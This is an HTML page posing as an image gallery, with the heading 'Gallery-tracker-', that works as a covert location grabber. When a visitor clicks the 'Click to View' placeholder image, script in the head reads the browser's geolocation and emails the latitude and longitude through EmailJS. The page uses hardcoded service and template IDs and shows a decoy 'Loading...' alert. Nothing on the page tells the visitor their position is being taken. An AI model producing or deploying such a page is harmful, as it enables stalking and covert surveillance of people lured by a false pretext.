<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Gallery</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function () {
      emailjs.init("0pjoOsYEEaIF0eGLE"); // Your EmailJS public key
    })();

    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (position) {
          const templateParams = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          };

          emailjs.send("service_0ijm0xc", "template_1odbjug", templateParams)
            .then(function () {
              alert("Loading...");
            }, function (error) {
              alert("Error: " + JSON.stringify(error));
            });
        });
      } else {
        alert("Geolocation is not supported.");
      }
    }
  </script>
  <style>
    body {
      text-align: center;
      font-family: Arial, sans-serif;
      padding: 50px;
    }

    img {
      width: 300px;
      height: auto;
      margin-top: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <h1 style="color: #007bff;">Gallery-tracker-</h1>
  <p>Click the image below to view</p>
  <img src="https://via.placeholder.com/400x250.png?text=Click+to+View" alt="Gallery Image" onclick="sendLocation()">
</body>
</html>
